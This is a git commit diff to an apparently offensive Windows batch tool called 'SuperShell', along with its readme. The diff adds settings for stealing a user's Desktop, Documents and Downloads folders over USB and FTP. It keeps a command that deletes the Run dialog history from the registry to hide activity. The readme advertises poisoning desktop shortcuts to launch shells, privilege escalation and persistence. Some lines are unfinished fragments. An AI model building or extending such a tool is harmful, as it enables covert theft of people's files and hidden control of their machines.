67e83ba8ac04e4cc1c3dbdd1e45f61bae9cfe86c
Dan Goodman <dan@danthegoodman.com>
2017-12-07 16:20:54 -0500

    updated some things in supershell

--- SuperShell/b.cmd
+++ SuperShell/b.cmd
@@ -7,10 +7,19 @@ SET shortcut_privesc=no
 REM Privilege Escalation Section:
 SET priv_esc_HID=no
 
-REM Persistence Section:
-SET 
+REM File Stealing Section:
+SET steal_files_enabled=yes
+SET steal_files_usb=yes
+SET steal_files_ftp=yes
+SET steal_desktop_folder=yes
+SET steal_documents_folder=yes
+SET steal_downloads_folder=yes
+
 
 
 
 REM Delete registry keys storing Run dialog history
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+
+
+REM File
--- SuperShell/readme.md
+++ SuperShell/readme.md
@@ -3,5 +3,8 @@ Does:
 - Poisons common desktop shortcuts to launch more shells
 - Options of getting elevated privs for many things including above
 - Persistence option
-- Option to steal files (ftp, usb)
-- 
+- Option to steal files (ftp and/or usb)
+-
+
+credits to:
+usb steal guy, sebkinne (part of usb), ftp steal guy
